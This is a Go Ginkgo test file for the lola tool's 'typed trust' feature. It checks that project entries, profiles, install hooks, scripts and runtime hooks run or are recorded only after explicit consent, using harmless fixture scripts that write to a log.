package engine_test

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"os"
	"path/filepath"
	"slices"
	"strings"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"
	"github.com/onsi/gomega/types"

	"github.com/trevor-vaughan/lola-go/internal/engine"
	"github.com/trevor-vaughan/lola-go/internal/errs"
	"github.com/trevor-vaughan/lola-go/internal/ledger"
	"github.com/trevor-vaughan/lola-go/internal/paths"
	"github.com/trevor-vaughan/lola-go/internal/target"
	"github.com/trevor-vaughan/lola-go/internal/targets"
	"github.com/trevor-vaughan/lola-go/internal/testenv"
)

// consentRun is the run a refusal for want of consent hints: what follows "then consent to it: " in
// its first hint naming it; "" for none.
func consentRun(err error) string {
	for _, h := range errs.Hints(err) {
		if _, run, ok := strings.Cut(h, "then consent to it: "); ok {
			return run
		}
	}
	return ""
}

// unshown is the hints of a refusal of what (this hook, this script) lola has not shown you, in
// place of "then consent to it: <run>": the dry run that shows it, then run; or run with --unseen.
func unshown(what, run string) []string {
	return []string{"lola has not shown you " + what + "; see it with " + run + " -n, then consent to it: " + run,
		"or add --unseen to consent without seeing it: " + run + " --unseen"}
}

// answer is a receipt that answers ok, or err.
func answer(ok bool, err error) func([]engine.Consent) (bool, error) {
	return func([]engine.Consent) (bool, error) { return ok, err }
}

// askYes is a terminal's hook question answered yes for the modules named, and No for the rest.
func askYes(modules ...string) func(string, []engine.HookScript) (bool, error) {
	return func(m string, _ []engine.HookScript) (bool, error) { return slices.Contains(modules, m), nil }
}

var _ = Describe("typed trust", func() {
	var (
		tmp, proj, log string
		p              paths.Paths
		e              *engine.Engine
		sc             engine.Scope
		ctx            = context.Background()
	)
	// script appends the hook's event to the log, so a spec sees whether it ran.
	const script = "#!/bin/sh\necho \"$LOLA_HOOK $LOLA_MODULE_NAME\" >> \"$HOOK_LOG\"\n"
	// kit writes the module kit into the project at mods/kit, its hooks as yaml declares them.
	kit := func(hooks string) {
		GinkgoHelper()
		files := map[string]string{"mods/kit/lola.yml": "name: kit\n", "mods/kit/commands/kit.md": "Kit\n",
			"mods/kit/hooks/pre.sh": script, "mods/kit/hooks/post.sh": script}
		if hooks != "" {
			files["mods/kit/lola.yml"] = "name: kit\nhooks: " + hooks + "\n"
		}
		writeTree(proj, files)
		for _, s := range []string{"pre.sh", "post.sh"} {
			Expect(os.Chmod(filepath.Join(proj, "mods", "kit", "hooks", s), 0o755)).To(Succeed())
		}
	}
	// deploy writes the plugin deploy into the project at mods/deploy, with a runtime hook that runs
	// command.
	deploy := func(command string) {
		GinkgoHelper()
		writeTree(proj, map[string]string{"mods/deploy/.claude-plugin/plugin.json": `{"name":"deploy"}`, "mods/deploy/commands/ship.md": "Ship\n",
			"mods/deploy/hooks/hooks.json": `{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"` + command + `"}]}]}}`})
	}
	// pull writes project.yml behind lola's back, as a git pull would: its entries are untrusted.
	pull := func(modules ...string) {
		GinkgoHelper()
		content := "version: 1\ntargets: [claude-code]\nmodules:\n"
		for _, m := range modules {
			content += "  - {name: " + m + ", source: ./mods/" + m + "}\n"
		}
		writeTree(proj, map[string]string{".lola/project.yml": content})
	}
	ran := func() []string {
		GinkgoHelper()
		b, err := os.ReadFile(log)
		if errors.Is(err, os.ErrNotExist) {
			return nil
		}
		Expect(err).NotTo(HaveOccurred())
		return strings.Split(strings.TrimSpace(string(b)), "\n")
	}
	consented := func() string {
		GinkgoHelper()
		b, err := os.ReadFile(p.Consent)
		if errors.Is(err, os.ErrNotExist) {
			return ""
		}
		Expect(err).NotTo(HaveOccurred())
		return string(b)
	}
	trusts := func(module string) bool {
		GinkgoHelper()
		r, err := e.Trust.Load(proj)
		Expect(err).NotTo(HaveOccurred())
		return r.View.Find(module) != nil
	}
	receipt := func(answer bool, got *[]engine.Consent) func([]engine.Consent) (bool, error) {
		return func(cs []engine.Consent) (bool, error) {
			*got = append(*got, cs...)
			return answer, nil
		}
	}
	BeforeEach(func() {
		var err error
		tmp, err = filepath.EvalSymlinks(testenv.Isolate())
		Expect(err).NotTo(HaveOccurred())
		p, err = paths.Resolve(os.Getenv)
		Expect(err).NotTo(HaveOccurred())
		e = engine.New(p, targets.Builtin())
		proj, log = filepath.Join(tmp, "proj"), filepath.Join(tmp, "hooks.log")
		e.Getwd = func() (string, error) { return proj, nil }
		e.Environ = func() []string { return append(os.Environ(), "HOOK_LOG="+log) }
		sc = engine.Scope{Kind: target.Project, ProjectDir: proj}
		Expect(os.MkdirAll(proj, 0o755)).To(Succeed())
	})

	It("--trust with no value means entries and profiles, and covers no hook, script or runtime hook", func() {
		k, err := engine.ParseTrust("sync", []string{engine.TrustBareValue})
		Expect(err).NotTo(HaveOccurred())
		Expect(k).To(Equal(engine.TrustEntries | engine.TrustProfiles))
		Expect(k.Covers(engine.TrustHooks) || k.Covers(engine.TrustScripts) || k.Covers(engine.TrustRuntimeHooks)).To(BeFalse())

		kit("{pre-install: hooks/pre.sh}")
		pull("kit")
		_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: k}})
		Expect(err).To(MatchError(HavePrefix("kit has a pre-install hook, and lola runs hooks only with your consent: ")))
		// kit's new version is not in your cache, which a refused run leaves as it was: its folder
		// shows it.
		Expect(errs.Hints(err)).To(HaveExactElements("review it: lola info --project ./mods/kit --target claude-code",
			MatchRegexp(`^lola has not shown you this hook; see it with lola sync --project --trust=entries,profiles,hooks --at kit=sha256:[0-9a-f]{64} -n, then consent to it: `),
			MatchRegexp(`^or add --unseen to consent without seeing it: lola sync --project --trust=entries,profiles,hooks --at kit=sha256:[0-9a-f]{64} --unseen$`)), "the consent pins the version shown")
		Expect(ran()).To(BeNil())
		Expect(trusts("kit")).To(BeFalse())
	})

	DescribeTable("the --trust value is parsed by its rules, a bare --trust told apart by a value no argument can hold",
		func(command string, values []string, want engine.TrustKinds, msg string, fix *engine.TrustKinds) {
			k, err := engine.ParseTrust(command, values)
			if msg == "" {
				Expect(err).NotTo(HaveOccurred())
				Expect(k).To(Equal(want))
				return
			}
			Expect(err).To(MatchError(msg))
			fe, ok := errors.AsType[*engine.TrustFlagError](err)
			Expect(ok).To(BeTrue())
			Expect(fe.HasFix).To(Equal(fix != nil))
			if fix != nil {
				Expect(fe.Fix).To(Equal(*fix))
			}
		},
		Entry("bare --trust is a value no typed --trust= gives", "sync", []string{engine.TrustBareValue}, engine.TrustBare, "", nil),
		Entry("--trust=entries,profiles written on profile --add is refused", "profile --add", []string{"entries,profiles"}, engine.TrustKinds(0),
			"lola profile --add never asks for entries trust; it takes --trust=profiles", new(engine.TrustProfiles)),
		Entry("bare --trust beside a kind install takes is still refused", "install", []string{engine.TrustBareValue, "hooks"}, engine.TrustKinds(0),
			"lola install never asks for entries or profiles trust; it takes --trust=scripts,hooks,runtime-hooks", new(engine.TrustHooks)),
		Entry("three refused kinds read as a list", "profile --add", []string{"entries,scripts,hooks"}, engine.TrustKinds(0),
			"lola profile --add never asks for entries, scripts or hooks trust; it takes --trust=profiles", new(engine.TrustKinds(0))),
		Entry("a trailing comma hints the value without it", "sync", []string{"hooks,"}, engine.TrustKinds(0),
			`--trust: "" is not a kind of trust; kinds are entries, profiles, scripts, hooks, runtime-hooks, all`, new(engine.TrustHooks)),
		Entry("--trust= hints bare --trust only where the command takes entries", "profile --add", []string{""}, engine.TrustKinds(0),
			"--trust= names no kind; kinds are entries, profiles, scripts, hooks, runtime-hooks, all", nil),
	)

	DescribeTable("an argument after a bare --trust is a kind when every part of it names one, in any case",
		func(arg string, want engine.TrustKinds, is bool) {
			k, ok := engine.TrustArgument("sync", arg)
			Expect(ok).To(Equal(is))
			Expect(k).To(Equal(want))
		},
		Entry("a kind", "hooks", engine.TrustHooks, true),
		Entry("in another case", "Hooks", engine.TrustHooks, true),
		Entry("a list", "hooks,scripts", engine.TrustHooks|engine.TrustScripts, true),
		Entry("all", "ALL", engine.TrustAll, true),
		Entry("a module", "kit", engine.TrustKinds(0), false),
		Entry("a list with a module", "hooks,kit", engine.TrustKinds(0), false),
	)

	DescribeTable("--trust=all covers exactly the kinds the command takes, and no hint ever writes all",
		func(command string, want engine.TrustKinds, arg string) {
			k, err := engine.ParseTrust(command, []string{"all"})
			Expect(err).NotTo(HaveOccurred())
			Expect(k).To(Equal(want))
			Expect(k.Arg()).To(Equal(arg))
			for sub := range engine.TrustAll + 1 {
				Expect(sub.Arg()).NotTo(ContainSubstring("all"), "a hint names exact kinds")
			}
		},
		Entry("sync", "sync", engine.TrustAll, "--trust=entries,profiles,scripts,hooks,runtime-hooks"),
		Entry("profile", "profile", engine.TrustAll, "--trust=entries,profiles,scripts,hooks,runtime-hooks"),
		Entry("profile --add", "profile --add", engine.TrustProfiles, "--trust=profiles"),
		Entry("install", "install", engine.TrustScripts|engine.TrustHooks|engine.TrustRuntimeHooks, "--trust=scripts,hooks,runtime-hooks"),
		Entry("update", "update", engine.TrustAll, "--trust=entries,profiles,scripts,hooks,runtime-hooks"),
		Entry("migrate", "migrate", engine.TrustEntries|engine.TrustScripts|engine.TrustHooks|engine.TrustRuntimeHooks, "--trust=entries,scripts,hooks,runtime-hooks"),
	)

	DescribeTable("off a terminal an uncovered run refuses, hinting the run with exactly the missing kinds and its own flags",
		func(setup func() error, msg string, hints []string) {
			err := setup()
			Expect(err).To(MatchError(ContainSubstring(msg)))
			got := errs.Hints(err)
			for i := range got {
				got[i] = folderDigest.ReplaceAllString(got[i], "=sha256:<digest>")
			}
			Expect(got).To(Equal(hints))
			Expect(consented()).To(BeEmpty())
		},
		Entry("entries", func() error {
			kit("")
			pull("kit")
			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Display: []string{"--json"}}, Display: []string{"--json"}})
			return err
		}, "lola sync needs your trust for .lola/project.yml, which has not been trusted on this machine, and there is no terminal to ask on",
			[]string{"see them: lola sync --project --json -n", "then accept them: lola sync --project --trust=entries --at kit=sha256:<digest> --json"}),
		Entry("profiles", func() error {
			kit("")
			writeTree(proj, map[string]string{".lola/profiles/go.yml": "version: 1\ntargets: [claude-code]\nmodules:\n  - {name: kit, source: ../../mods/kit}\n"})
			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Profiles: &engine.ProfileChange{Action: engine.ProfileOn, Name: "project:go"},
				Options: engine.Options{Trust: engine.TrustEntries}})
			return err
		}, "lola profile needs your trust for", []string{"see them: lola profile --project project:go --on --trust=entries -n",
			"then accept them: lola profile --project project:go --on --trust=entries,profiles"}),
		Entry("hooks", func() error {
			kit("{pre-install: hooks/pre.sh}")
			pull("kit")
			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries, Display: []string{"--plain"}},
				Display: []string{"--plain"}})
			return err
		}, "kit has a pre-install hook, and lola runs hooks only with your consent",
			append([]string{"review it: lola info --project ./mods/kit --target claude-code --plain"},
				unshown("this hook", "lola sync --project --trust=entries,hooks --at kit=sha256:<digest> --plain")...)),
		Entry("entries+hooks", func() error {
			kit("{pre-install: hooks/pre.sh}")
			pull("kit")
			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc})
			return err
		}, "lola sync needs your trust for .lola/project.yml",
			[]string{"see them: lola sync --project -n", "then accept them: lola sync --project --trust=entries,hooks --at kit=sha256:<digest>"}),
		Entry("remote --add", func() error {
			_, err := e.AddProfile(ctx, engine.ProfileAddRequest{Name: "go", Source: "https://example.com/profiles.git", Rerun: []string{"--json"}})
			return err
		}, "lola profile --add shows the profile and asks before adding it, and there is no terminal to ask on",
			[]string{"see it: lola profile go --add https://example.com/profiles.git -n --json",
				"then add it unasked: lola profile go --add https://example.com/profiles.git --trust=profiles --json"}),
	)

	It("a refusal for removals alone adds the hook kind the next run would be refused without", func() {
		kit("{pre-install: hooks/pre.sh}")
		user := engine.Scope{Kind: target.User}
		writeTree(tmp, map[string]string{"src/plain/lola.yml": "name: plain\n", "src/plain/commands/plain.md": "Plain\n"})
		_, err := e.Install(ctx, user, proj, []engine.InstallRequest{{Arg: filepath.Join(tmp, "src", "plain")}}, engine.Options{Targets: []string{"claude-code"}})
		Expect(err).NotTo(HaveOccurred())
		writeTree(p.UserProfiles, map[string]string{"default.yml": "version: 1\ntargets: [claude-code]\nmodules:\n  - {name: kit, source: " +
			filepath.Join(proj, "mods", "kit") + "}\n"})
		_, err = e.Sync(ctx, engine.SyncRequest{Scope: user})
		Expect(err).To(MatchError("lola sync needs your confirmation to remove plain, and there is no terminal to ask on"))
		Expect(errs.Hints(err)).To(ConsistOf("see them: lola sync --user -n", MatchRegexp(`^then confirm them: lola sync --user --trust=hooks --at kit=sha256:[0-9a-f]{64} -y$`)))
	})

	It("a No to the removals records no trust --trust gave, and keeps what a terminal answer accepted", func() {
		kit("")
		writeTree(proj, map[string]string{"mods/plain/lola.yml": "name: plain\n", "mods/plain/commands/plain.md": "Plain\n"})
		_, err := e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: filepath.Join(proj, "mods", "plain")}}, engine.Options{Targets: []string{"claude-code"}})
		Expect(err).NotTo(HaveOccurred())
		pull("kit")
		no := func([]engine.Removal) (bool, error) { return false, nil }
		_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, ConfirmRemovals: no, Options: engine.Options{Trust: engine.TrustEntries}})
		Expect(errors.Is(err, engine.ErrDeclined)).To(BeTrue(), "%v", err)
		Expect(trusts("kit")).To(BeFalse(), "the flag's grant waits for the receipt, which a No never reaches")

		_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, ConfirmRemovals: no,
			Trust: func(engine.TrustReport) (engine.TrustAnswer, error) { return engine.TrustAnswer{All: true}, nil }})
		Expect(errors.Is(err, engine.ErrDeclined)).To(BeTrue(), "%v", err)
		Expect(trusts("kit")).To(BeTrue(), "a terminal answer is recorded on a No to the removals")
	})

	It("-y and --force grant no kind of trust", func() {
		kit("{pre-install: hooks/pre.sh}")
		pull("kit")
		yes := func([]engine.Removal) (bool, error) { return true, nil }
		_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, ConfirmRemovals: yes, Options: engine.Options{Force: true}})
		Expect(err).To(MatchError(ContainSubstring("lola sync needs your trust for .lola/project.yml")))
		Expect(err).To(MatchError(ContainSubstring("-y confirms removals only; accept them with --trust=entries,hooks")))

		_, err = e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: filepath.Join(proj, "mods", "kit")}},
			engine.Options{Targets: []string{"claude-code"}, Force: true})
		Expect(err).To(MatchError(HavePrefix("kit has a pre-install hook, and lola runs hooks only with your consent: ")))
		Expect(ran()).To(BeNil())
		Expect(consented()).To(BeEmpty())
	})

	It("a post-install hook or runtime hook not covered is declined with a warning naming --trust=<kind>", func() {
		kit("{post-install: hooks/post.sh}")
		deploy("true")
		pull("kit", "deploy")
		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries}})
		Expect(err).NotTo(HaveOccurred())
		Expect(res.Notices).To(ContainElement(HaveField("Text", "kit: post-install hook skipped without your consent; "+
			"review and run it: lola sync --project kit, or consent without asking: lola sync --project kit --trust=hooks")))
		Expect(res.Findings).To(ContainElement(And(HaveField("Code", "claude-code/runtime-hooks-declined"),
			HaveField("Hint", MatchRegexp(`^review the hooks listed above, then, if you want to install them, consent to them: lola sync --project --trust=entries,runtime-hooks`+
				` --at deploy=sha256:[0-9a-f]{64} --at kit=sha256:[0-9a-f]{64}$`)))))
		Expect(ran()).To(BeNil())
	})

	It("a terminal yes in a batch's collect pass is the consent its apply pass runs on, recorded then", func() {
		kit("{pre-install: hooks/pre.sh}")
		deploy("true")
		pull("kit", "deploy")
		asked := 0
		collect := func(batch *engine.TrustBatch) {
			GinkgoHelper()
			_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries, Batch: batch,
				Ask:             func(string, []engine.HookScript) (bool, error) { asked++; return true, nil },
				AskRuntimeHooks: func(string, []engine.RuntimeHook) (bool, error) { asked++; return true, nil }}})
			Expect(err).To(MatchError(engine.ErrBatched))
		}
		batch := &engine.TrustBatch{}
		collect(batch)
		Expect(asked).To(Equal(2), "the hook and the runtime hooks, each asked once")
		Expect(consented()).To(BeEmpty(), "nothing is recorded before the command's receipt")

		// The apply pass asks nothing: the batch holds the yes answers, by key and digest.
		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries, Expect: batch}})
		Expect(err).NotTo(HaveOccurred())
		Expect(ran()).To(Equal([]string{"pre-install kit"}))
		Expect(res.Findings).NotTo(ContainElement(HaveField("Code", "claude-code/runtime-hooks-declined")))
		Expect(consented()).To(And(ContainSubstring(`"kit"`), ContainSubstring("deploy/runtime-hooks/")), "recorded just before the apply")

		// A hook changed between the passes is not the one answered: it is refused as without consent.
		kit("{pre-install: hooks/pre.sh}")
		writeTree(proj, map[string]string{"mods/kit/hooks/pre.sh": script + "true\n"})
		batch = &engine.TrustBatch{}
		collect(batch)
		writeTree(proj, map[string]string{"mods/kit/hooks/pre.sh": script + "true # changed after the answer\n"})
		_, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries, Expect: batch}})
		Expect(err).To(MatchError(HavePrefix("kit has a pre-install hook, and lola runs hooks only with your consent: ")))
		Expect(ran()).To(Equal([]string{"pre-install kit"}), "it did not run again")
	})

	It("a batch's equivalent command repeats no consent kind the collect pass was told no", func() {
		deploy("true")
		writeTree(proj, map[string]string{"mods/gate/.claude-plugin/plugin.json": `{"name":"gate"}`, "mods/gate/commands/gate.md": "Gate\n",
			"mods/gate/hooks/hooks.json": `{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo gate"}]}]}}`})
		pull("deploy", "gate")
		all := func(engine.TrustReport) (engine.TrustAnswer, error) { return engine.TrustAnswer{All: true}, nil }
		batch := &engine.TrustBatch{}
		_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Trust: all, Options: engine.Options{Batch: batch,
			AskRuntimeHooks: func(m string, _ []engine.RuntimeHook) (bool, error) { return m == "deploy", nil }}})
		Expect(err).To(MatchError(engine.ErrBatched))

		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Trust: all, Options: engine.Options{Expect: batch}})
		Expect(err).NotTo(HaveOccurred())
		status := map[string]string{}
		for _, m := range res.Modules {
			for _, h := range m.RuntimeHooks {
				status[m.Name] = h.Status
			}
		}
		Expect(status).To(Equal(map[string]string{"deploy": engine.RuntimeHooksGranted, "gate": engine.RuntimeHooksDeclined}))
		Expect(res.Equivalent).To(BeEmpty(), "--trust=runtime-hooks would grant gate's, refused; without it deploy's are removed")
	})

	It("an equivalent command carries the consent kinds answered yes and pins no version for them, its module's version changed or not", func() {
		kit("")
		deploy("true")
		pull("deploy")
		all := func(engine.TrustReport) (engine.TrustAnswer, error) { return engine.TrustAnswer{All: true}, nil }
		yes := func(string, []engine.RuntimeHook) (bool, error) { return true, nil }
		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Trust: all, Options: engine.Options{AskRuntimeHooks: yes}})
		Expect(err).NotTo(HaveOccurred())
		Expect(res.Equivalent).To(Equal("lola sync --project --trust=entries,runtime-hooks"))

		// deploy's consent is gone, its version the one installed: a yes still prints the command.
		Expect(os.Remove(p.Consent)).To(Succeed())
		pull("deploy", "kit")
		res, err = e.Sync(ctx, engine.SyncRequest{Scope: sc, Trust: all, Options: engine.Options{AskRuntimeHooks: yes}})
		Expect(err).NotTo(HaveOccurred())
		Expect(res.Modules).To(ContainElement(And(HaveField("Name", "deploy"),
			HaveField("RuntimeHooks", HaveEach(HaveField("Status", engine.RuntimeHooksGranted))))))
		Expect(res.Equivalent).To(Equal("lola sync --project --trust=entries,runtime-hooks"))
	})

	It("--at pins versions alone: a hook consent kind reaches the modules it does not pin too", func() {
		kit("{post-install: hooks/post.sh}")
		deploy("true")
		writeTree(proj, map[string]string{"mods/gate/.claude-plugin/plugin.json": `{"name":"gate"}`, "mods/gate/commands/gate.md": "Gate\n",
			"mods/gate/hooks/hooks.json": `{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo gate"}]}]}}`})
		pull("deploy", "gate", "kit")
		_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries}})
		Expect(err).NotTo(HaveOccurred())
		led, err := ledger.Load(filepath.Join(proj, ".lola", "lock.json"))
		Expect(err).NotTo(HaveOccurred())
		at := func(names ...string) map[string]string {
			out := map[string]string{}
			for _, n := range names {
				out[n] = led.Modules[n].Digest
			}
			return out
		}
		status := func(res *engine.SyncResult) map[string]string {
			out := map[string]string{}
			for _, m := range res.Modules {
				for _, h := range m.RuntimeHooks {
					out[m.Name] = h.Status
				}
			}
			return out
		}

		// gate and kit are installed and unchanged, their hooks never consented to: --at deploy pins
		// deploy's version, and --trust's consent reaches theirs as well.
		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, At: at("deploy"),
			Options: engine.Options{Trust: engine.TrustEntries | engine.TrustHooks | engine.TrustRuntimeHooks, Unseen: true}})
		Expect(err).NotTo(HaveOccurred())
		Expect(status(res)).To(Equal(map[string]string{"deploy": engine.RuntimeHooksGranted, "gate": engine.RuntimeHooksGranted}))
		Expect(ran()).To(Equal([]string{"post-install kit"}))
	})

	It("a consent hint after a run that showed no new version pins no version", func() {
		deploy("true")
		user := engine.Scope{Kind: target.User}
		_, err := e.Install(ctx, user, proj, []engine.InstallRequest{{Arg: filepath.Join(proj, "mods", "deploy")}},
			engine.Options{Targets: []string{"claude-code"}})
		Expect(err).NotTo(HaveOccurred())
		res, err := e.Sync(ctx, engine.SyncRequest{Scope: user})
		Expect(err).NotTo(HaveOccurred())
		var hint string
		for _, f := range res.Findings {
			if f.Code == "claude-code/runtime-hooks-declined" {
				hint = f.Hint
			}
		}
		Expect(hint).To(HaveSuffix("consent to them: lola sync --user --trust=runtime-hooks"))
	})

	It("a partial answer's equivalent command names the modules it accepted, and does what the answer did", func() {
		kit("")
		pull("kit")
		_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries}})
		Expect(err).NotTo(HaveOccurred())
		deploy("true")
		writeTree(proj, map[string]string{"mods/gate/.claude-plugin/plugin.json": `{"name":"gate"}`, "mods/gate/commands/gate.md": "Gate\n"})
		pull("kit", "deploy", "gate")
		deployOnly := func(engine.TrustReport) (engine.TrustAnswer, error) {
			return engine.TrustAnswer{Modules: []string{"deploy"}}, nil
		}
		yes := func(string, []engine.RuntimeHook) (bool, error) { return true, nil }
		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Trust: deployOnly, Options: engine.Options{AskRuntimeHooks: yes}})
		Expect(err).NotTo(HaveOccurred())
		Expect(res.Equivalent).To(Equal("lola sync --project deploy --trust=entries,runtime-hooks"))
	})

	It("a dry run's consent hint also trusts the changes it shows, so it works as printed", func() {
		deploy("true")
		pull("deploy")
		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{DryRun: true}})
		Expect(err).NotTo(HaveOccurred())
		Expect(res.Findings).To(ContainElement(And(HaveField("Code", "claude-code/runtime-hooks-declined"),
			HaveField("Hint", MatchRegexp(`consent to them: lola sync --project --trust=entries,runtime-hooks --at deploy=sha256:[0-9a-f]{64}$`)))))
	})

	It("an equivalent command never carries a consent kind with an item nobody was asked about", func() {
		kit("")
		pull("kit")
		_, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: engine.TrustEntries}})
		Expect(err).NotTo(HaveOccurred())
		// A record-only change (the targets kit has already) installs no copy, so the post-install
		// script, with nothing to wrap, is not asked about.
		writeTree(proj, map[string]string{
			".lola/project.yml": "version: 1\ntargets: [claude-code]\npre_install: ci/pre.sh\npost_install: ci/post.sh\nmodules:\n" +
				"  - {name: kit, source: ./mods/kit, targets: [claude-code]}\n",
			"ci/pre.sh": script, "ci/post.sh": script})
		Expect(os.Chmod(filepath.Join(proj, "ci", "pre.sh"), 0o755)).To(Succeed())
		Expect(os.Chmod(filepath.Join(proj, "ci", "post.sh"), 0o755)).To(Succeed())
		var asked []string
		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc,
			Trust:   func(engine.TrustReport) (engine.TrustAnswer, error) { return engine.TrustAnswer{All: true}, nil },
			Options: engine.Options{AskScript: func(q engine.ScriptQuestion) (bool, error) { asked = append(asked, q.Event); return true, nil }}})
		Expect(err).NotTo(HaveOccurred())
		Expect(asked).To(Equal([]string{engine.PreInstall}))
		Expect(res.Equivalent).To(BeEmpty(), "--trust=scripts would grant the post-install script, never asked about")
	})

	It("a dry run's command adds exactly the trust kinds the run needs", func() {
		kit("{pre-install: hooks/pre.sh}")
		pull("kit")
		for _, given := range []engine.TrustKinds{0, engine.TrustEntries, engine.TrustHooks, engine.TrustRuntimeHooks} {
			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{DryRun: true, Trust: given}})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.OffTerminal).To(Equal("lola sync --project " + (given | engine.TrustEntries | engine.TrustHooks).Arg()))
			Expect(res.EquivalentCommands).To(Equal([]string{res.OffTerminal}))
		}
		Expect(consented()).To(BeEmpty())
	})

	DescribeTable("consent given by --trust is recorded as a yes at the prompt is, for every kind, and a changed digest or view asks again",
		func(given engine.TrustKinds, setup func(), change func(), asked func(*int) engine.SyncRequest) {
			setup()
			res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{Trust: given, Unseen: true}})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.Trusted).NotTo(BeEmpty())

			n := 0
			_, err = e.Sync(ctx, asked(&n))
			Expect(err).NotTo(HaveOccurred())
			Expect(n).To(BeZero(), "the grant is recorded: nothing asks again")

			change()
			_, err = e.Sync(ctx, asked(&n))
			Expect(err).NotTo(HaveOccurred())
			Expect(n).To(Equal(1), "a changed digest or view asks again")
		},
		Entry("entries", engine.TrustEntries, func() { kit(""); pull("kit") }, func() {
			writeTree(proj, map[string]string{".lola/project.yml": "version: 1\ntargets: [claude-code]\nmodules:\n  - {name: kit, source: ./mods/kit, rules: false}\n"})
		}, func(n *int) engine.SyncRequest {
			return engine.SyncRequest{Scope: sc, Trust: func(engine.TrustReport) (engine.TrustAnswer, error) { *n++; return engine.TrustAnswer{All: true}, nil }}
		}),
		Entry("profiles", engine.TrustEntries|engine.TrustProfiles, func() {
			kit("")
			writeTree(proj, map[string]string{".lola/profiles/go.yml": "version: 1\ntargets: [claude-code]\nmodules:\n  - {name: kit, source: ../../mods/kit}\n"})
			led := &ledger.Ledger{Version: ledger.Version, Modules: map[string]*ledger.Entry{}, Profile: &ledger.Active{Name: "project:go", By: ledger.ByOn}}
			Expect(led.Save(filepath.Join(proj, ".lola", "lock.json"))).To(Succeed())
		}, func() {
			writeTree(proj, map[string]string{".lola/profiles/go.yml": "version: 1\ntargets: [claude-code]\nmodules:\n  - {name: kit, source: ../../mods/kit, rules: false}\n"})
		}, func(n *int) engine.SyncRequest {
			return engine.SyncRequest{Scope: sc, Trust: func(engine.TrustReport) (engine.TrustAnswer, error) { *n++; return engine.TrustAnswer{All: true}, nil }}
		}),
		Entry("scripts", engine.TrustEntries|engine.TrustScripts, func() {
			kit("")
			writeTree(proj, map[string]string{".lola/project.yml": "version: 1\ntargets: [claude-code]\npre_install: ci/check.sh\nmodules:\n  - {name: kit, source: ./mods/kit}\n",
				"ci/check.sh": script})
			Expect(os.Chmod(filepath.Join(proj, "ci", "check.sh"), 0o755)).To(Succeed())
		}, func() {
			writeTree(proj, map[string]string{"ci/check.sh": script + "true\n"})
		}, func(n *int) engine.SyncRequest {
			// a copy the sync writes again, for the script to wrap
			Expect(os.RemoveAll(filepath.Join(proj, ".lola", "modules", "kit"))).To(Succeed())
			return engine.SyncRequest{Scope: sc, Options: engine.Options{AskScript: func(engine.ScriptQuestion) (bool, error) { *n++; return true, nil }}}
		}),
		Entry("hooks", engine.TrustEntries|engine.TrustHooks, func() { kit("{pre-install: hooks/pre.sh}"); pull("kit") }, func() {
			writeTree(proj, map[string]string{"mods/kit/hooks/pre.sh": script + "true\n"})
		}, func(n *int) engine.SyncRequest {
			return engine.SyncRequest{Scope: sc, Trust: func(engine.TrustReport) (engine.TrustAnswer, error) { return engine.TrustAnswer{All: true}, nil },
				Options: engine.Options{Ask: func(string, []engine.HookScript) (bool, error) { *n++; return true, nil }}}
		}),
		Entry("runtime-hooks", engine.TrustEntries|engine.TrustRuntimeHooks, func() {
			deploy("true")
			pull("deploy")
		}, func() { deploy("false") }, func(n *int) engine.SyncRequest {
			return engine.SyncRequest{Scope: sc, Trust: func(engine.TrustReport) (engine.TrustAnswer, error) { return engine.TrustAnswer{All: true}, nil },
				Options: engine.Options{AskRuntimeHooks: func(string, []engine.RuntimeHook) (bool, error) { *n++; return true, nil }}}
		}),
	)

	It("a dry run with --trust records no consent", func() {
		kit("{pre-install: hooks/pre.sh}")
		pull("kit")
		res, err := e.Sync(ctx, engine.SyncRequest{Scope: sc, Options: engine.Options{DryRun: true, Trust: engine.TrustEntries | engine.TrustHooks, Unseen: true}})
		Expect(err).NotTo(HaveOccurred())
		Expect(res.Trusted).To(ConsistOf(engine.Consent{Kind: "entries", Item: "targets", Change: engine.ConsentNew},
			engine.Consent{Kind: "entries", Item: "kit", Change: engine.ConsentNew},
			engine.Consent{Kind: "hooks", Item: "kit pre-install", Change: engine.ConsentNew}), "trusted lists what the flags would cover")
		Expect(consented()).To(BeEmpty())
		Expect(filepath.Join(proj, ".lola", "trust.json")).NotTo(BeAnExistingFile())
		Expect(ran()).To(BeNil())
	})

